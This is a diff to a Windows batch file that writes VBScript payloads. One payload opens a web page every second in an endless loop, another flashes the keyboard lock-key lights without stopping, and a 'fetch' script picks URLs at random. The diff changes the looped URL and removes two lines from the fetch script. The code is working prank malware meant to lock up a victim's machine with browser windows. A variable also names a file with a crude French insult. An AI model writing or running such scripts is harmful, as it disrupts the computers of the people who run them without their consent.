@@ -108,7 +108,7 @@ set file=alerte_enculay.mp3
 @echo do>>%twitch%.vbs
 @echo Dim wsh>>%twitch%.vbs
 @echo Set wsh=WScript.CreateObject("WScript.Shell")>>%twitch%.vbs
-@echo wsh.Run "http://p0wned.github.io/">>%twitch%.vbs
+@echo wsh.Run "https://mrparadoxal.github.io/">>%twitch%.vbs
 @echo WScript.Sleep 1000>>%twitch%.vbs
 @echo loop>>%twitch%.vbs
 
@@ -146,9 +146,6 @@ set file=alerte_enculay.mp3
 @echo wshshell.sendkeys "{NUMLOCK}">>%led%.vbs
 @echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
 @echo loop>>%led%.vbs
-
-@echo arabe = Array("https://mrparadoxal.github.io")>%fetch%.vbs
-@echo Set feug=wscript.CreateObject("WScript.Shell")>>%fetch%.vbs
 
 @echo dim r>>%fetch%.vbs
 @echo randomize>>%fetch%.vbs
